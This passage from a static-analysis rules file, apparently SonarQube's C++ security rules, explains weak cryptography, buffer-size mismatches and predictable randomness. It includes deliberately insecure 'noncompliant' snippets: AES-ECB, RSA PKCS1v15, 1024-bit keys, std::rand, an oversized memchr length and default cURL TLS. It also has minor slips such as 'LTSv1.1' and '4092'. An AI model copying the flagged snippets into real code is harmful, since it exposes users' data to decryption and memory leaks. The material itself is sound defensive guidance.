href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/ECB\", Botan::ENCRYPTION); // Noncompliant\n}\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n#include &lt;botan/pubkey.h&gt;\n\nvoid encrypt() {\n  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);\n  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);\n\n  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), \"PKCS1v15\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/GCM\", Botan::ENCRYPTION);\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n#include &lt;botan/pubkey.h&gt;\n\nvoid encrypt() {\n  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);\n  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);\n\n  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), \"OAEP\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5782": {
        "name": "POSIX functions should not be called with arguments that trigger buffer overflows",
        "htmlDesc": "<p>Some POSIX functions take one argument that is a buffer and another one that represents the size of the buffer. It is up to the developer to make\nsure the two arguments do match and that the size argument does not exceed the buffer’s size.</p>\n<h2>Why is this an issue?</h2>\n<p>When the size argument exceeds the actual size of the buffer, the memory management functions will either read or write data past the buffer memory\nboundary into adjacent memory. Because the memory might be uninitialized or contain other pieces of data, the behavior of the affected function can\nnot be predicted and will likely trigger bugs.</p>\n<h3>What is the potential impact?</h3>\n<p>Buffer boundaries violations can lead to serious security issues.</p>\n<h4>Information disclosure</h4>\n<p>In some scenarios, insecure functions can lead to information disclosure. For instance, if an attacker can cause a buffer overread, they might be\nable to disclose data in memory that they’re not supposed to have access to. This could potentially allow them to access sensitive information, such\nas passwords or encryption keys. An example of a buffer overread is provided with the Heartbleed vulnerability. ==== Code execution</p>\n<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to\noverwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the\nattacker full control over your system.</p>\n<h4>Denial of service</h4>\n<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,\nit can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,\nsuch as online platforms or databases.</p>\n<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it\nto become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>\n<h3>Exceptions</h3>\n<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic\npattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>In the following code example, <code>memchr</code> is used to find the first occurrence of the <code>@</code> character in a buffer,\n<code>array</code>. The second argument does not match the size of this buffer, so it may find an occurrence of the character after the end of the\nbuffer and read data it is not supposed to. If the returned <code>pos</code> pointer is later used to write characters, this could unexpectedly\noverwrite data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nchar array[10];\ninitialize(array);\nchar *pos = memchr(array, '@', 42); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nchar array[10];\ninitialize(array);\nchar *pos = memchr(array, '@', sizeof(array));\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Heartbleed - <a href=\"https://heartbleed.com/\">The Heartbleed Bug</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 - A06 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/131\">CWE-131 - Incorrect Calculation of Buffer Size</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/788\">CWE-788 - Access of Memory Location After End of Buffer</a> </li>\n</ul>\n<h3>External coding guidelines</h3>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/wtYxBQ\">ARR30-C. - Do not form or use out-of-bounds pointers or array subscripts</a>\n  </li>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/i3w-BQ\">STR50-CPP. - Guarantee that storage for strings has sufficient space for\n  character data and the null terminator</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cpp:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in cURL</h2>\n<h3>Code examples</h3>\n<p>The following code samples attempt to create an HTTP request.</p>\n<h4>Noncompliant code example</h4>\n<p>This sample uses Curl’s default TLS algorithms, which are weak cryptographical algorithms: TLSv1.0 and LTSv1.1.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n#include &lt;curl/curl.h&gt;\n\nvoid encrypt() {\n    CURL *curl;\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n\n    curl = curl_easy_init();                                      // Noncompliant\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n\n    curl_easy_perform(curl);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n#include &lt;curl/curl.h&gt;\n\nvoid encrypt() {\n    CURL *curl;\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n\n    curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://example.com/\");\n    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);\n\n    curl_easy_perform(curl);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive\ndata.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from\n  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;random&gt;\n// ...\n\nvoid f() {\n  int random_int = std::rand(); // Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;sodium.h&gt;\n#include &lt;botan/system_rng.h&gt;\n// ...\n\nvoid f() {\n  char random_chars[10];\n  randombytes_buf(random_chars, 10); // Compliant\n  uint32_t random_int = randombytes_uniform(10); // Compliant\n\n  uint8_t random_chars[10];\n  Botan::System_RNG system;\n  system.randomize(random_chars, 10); // Compliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UNcxBQ\">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2ns-BQ\">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/pubkey.h&gt;\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n\nvoid encrypt() {\n    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);\n    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant\n}\n</pre>\n<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;botan/dl_group.h&gt;\n\nvoid encrypt() {\n    Botan::DL_Group(\"dsa/botan/1024\"); // Noncompliant\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n#include &lt;botan/ec_group.h&gt;\n\nvoid encrypt() {\n    Botan::EC_Group(\"secp160k1\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/pubkey.h&gt;\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n\nvoid encrypt() {\n    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);\n    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#include &lt;botan/dl_group.h&gt;\n\nvoid encrypt() {\n    Botan::DL_Group(\"dsa/botan/2048\");\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n#include &lt;botan/ec_group.h&gt;\n\nvoid encrypt() {\n    Botan::EC_Group(\"secp224k1\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a 